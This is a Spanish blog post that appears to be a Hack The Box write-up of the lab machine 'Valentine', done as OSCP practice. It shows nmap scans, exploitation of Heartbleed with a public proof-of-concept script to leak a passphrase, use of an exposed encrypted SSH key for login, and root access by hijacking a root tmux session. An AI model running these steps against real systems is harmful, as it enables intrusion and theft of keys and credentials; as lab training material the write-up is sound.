---
layout: post
title:  "OSCP Path ~ Valentine de Hack The Box (Necesario VIP)"
description: Writeup de la maquina de HackTheBox llamada VALENTINE siguiendo el PATH para el OSCP
tags: HTB, OSCP Path, HeartBleed, fcrackzip, Tmux-Priv, Maquinas Retiradas, Writeup, Hacking
---

# Valentine ~ Hack The Box to OSCP

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10. 79      "
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2021-05-04T17:49:21+00:00; +1s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Lanzamos el script de `http-enum.nse`:
```bash
# nmap --script http-enum -p80,443 10.10.10.79 -oN Webscan                                                                        

PORT    STATE SERVICE
80/tcp  open  http
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
443/tcp open  https
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
```
Vamos a proseguir lanzando scripts de nmap para identificar vulnerabilidades:
```bash
# nmap --script ssl-heartbleed.nse -p22,80,443 10.10.10.79 -oN HeartbleetScan 

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://cvedetails.com/cve/2014-0160/
|_      http://www.openssl.org/news/secadv_20140407.txt 
```
# Definicion de Heartbleed
Heartbleed (español:  hemorragia de corazón) es un agujero de seguridad de software en la  biblioteca de código abierto OpenSSL,
solo vulnerable en su versión  1.0.1f, que permite a un atacante leer la memoria de un servidor o un  cliente, permitiéndole por ejemplo,
conseguir las claves privadas SSL de  un servidor.

Podriamos a ver conseguido ver que es vulnerable lanzando el siguiente comando tambien basado en cateegorias de scripts de nmap
```bash
nmap --script “vuln and safe” 10.10.10.79 -oN ScanManchine
```

# Explotando Heartbleed
Exploit funcional de Heartbleet
https://raw.githubusercontent.com/sensepost/heartbleed-poc/master/heartbleed-poc.py
Lo descargamos y Lo usamos de la siguiente forma:

Donde `-n` es para el `numero de ataques/peticiones` 
Y `-f` para `guardar el resultado` en un `archivo` de output.

```bash
─# python heartbleed-poc.py 10.10.10.79 -n 150 -f heardbleed_out.txt
```
Conseguimos sacar atraves del exploit una cadena de nbase 64 que anotamos en hases como contraseña.
```bash
# echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d                 
"heartbleedbelievethehype"
```
Chequeamos la web en las rutas que script `http-enum` nos habia enumerado.
En la ruta `http://10.10.10.79/dev/`
Encontramos un directory listing con dos archivos
```bash
hype_key
notes.txt
```
Aqui encontramos un archivo en formato `HEX` que reverseamos con el comando `xxd -ps -r` y le pasamos el archivo almacenado con nombre `hex`.
```bash
# xxd -ps -r hex 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY----- 
```
Credenciales: User - `hype` 
Procedemos a intentar conectarnos por `SSH` con las credenciales obtenidas y la `id_rsa`
```bash
# ssh -i id_rsa hype@10.10.10.79             
Enter passphrase for key 'id_rsa':  
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
hype@Valentine:~$ cd Desktop/
hype@Valentine:~/Desktop$ ls
user.txt
hype@Valentine:~/Desktop$ cat user.txt 
e6710a5464769fd5fcd2xxxxxxxxxxxxxxx
```
Conseguimos conectarnos y conseguimos la flag del `user.txt`

# Escalada de Privilegios
Procedemos a enumerar un poco el sistema con comandos basicos:
Usamos el comando `ìd` para ver los grupos a los que pertenece el usuario `hype` 
```bash
hype@Valentine:~/Desktop$ id
uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
```
Usamos el comando `uname -a` para sacar informacion sobre el sistema
```bash
hype@Valentine:~/Desktop$ uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```
Vemos si tiene algun puerto relevante internamente con el comando `netstat -antp`
```bash
hype@Valentine:~/Desktop$ netstat -antp
(No info could be read for "-p": geteuid()=1000 but you should be root.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp        0    488 10.10.10.79:22          10.10.14.12:49820      ESTABLISHED -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
tcp6       0      0 :::443                  :::*                    LISTEN      -  
```
Procedemos a realizar uso del comando `ps -aux` para listar los comandos que se estan ejecutando a nivel de sistema.
Encontramos una session de `tmux` en la ruta `/.devs/dev_sess` en los procesos. Intentamos apuntar a ella.
```bash
hype@Valentine:~/Desktop$ ps -aux
Warning: bad ps syntax, perhaps a bogus '-'? See http://procps.sf.net/faq.html
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root       1017  0.0  0.1  26416  1672 ?        Ss   05:10   0:00 /usr/bin/tmux -S /.devs/dev_sess
```
Conseguimos acceder al directorio `/.devs` y procedemos a intentar apropiarnos de la sesion de `tmux`
```bash
hype@Valentine:~/Desktop$ cd /.devs/
hype@Valentine:/.devs$ ls
dev_sess
```
Nos conseguimos apropiar de la session correctamente y vemos que ya somos `root`.
```bash
hype@Valentine:/.devs$ tmux -S dev_sess
```
Sacamos la flag de root
```bash
root@Valentine:/.devs# whoami
root
root@Valentine:/.devs# cat /root/root.txt
f1bb6d759df1f272914exxxxxxxxxxxxx
```

Maquina Rooteada =D 
